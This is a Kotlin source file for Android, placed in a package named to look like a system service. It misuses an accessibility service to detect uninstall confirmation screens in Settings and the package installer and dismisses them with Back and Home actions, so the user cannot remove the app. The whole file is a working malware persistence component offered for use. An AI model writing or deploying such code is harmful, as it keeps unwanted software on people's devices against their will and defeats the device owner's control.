// [context: Kotlin, Android API 26+, block uninstall via accessibility]
package com.system.service.persistence

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class SelfDefense(private val service: AccessibilityService) {

    private val uninstallPackages = setOf(
        "com.android.settings",
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.android.permissioncontroller"
    )

    fun handleEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in uninstallPackages) return
        val root = service.rootInActiveWindow ?: return

        if (isUninstallConfirmDialog(root)) {
            navigateBack()
        }
    }

    private fun isUninstallConfirmDialog(root: AccessibilityNodeInfo): Boolean {
        val text = collectText(root).lowercase()
        return text.contains("uninstall") || text.contains("remove app")
    }

    private fun navigateBack() {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
    }

    private fun collectText(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        sb.append(node.text ?: "")
        for (i in 0 until node.childCount) {
            sb.append(collectText(node.getChild(i) ?: continue))
        }
        return sb.toString()
    }
}
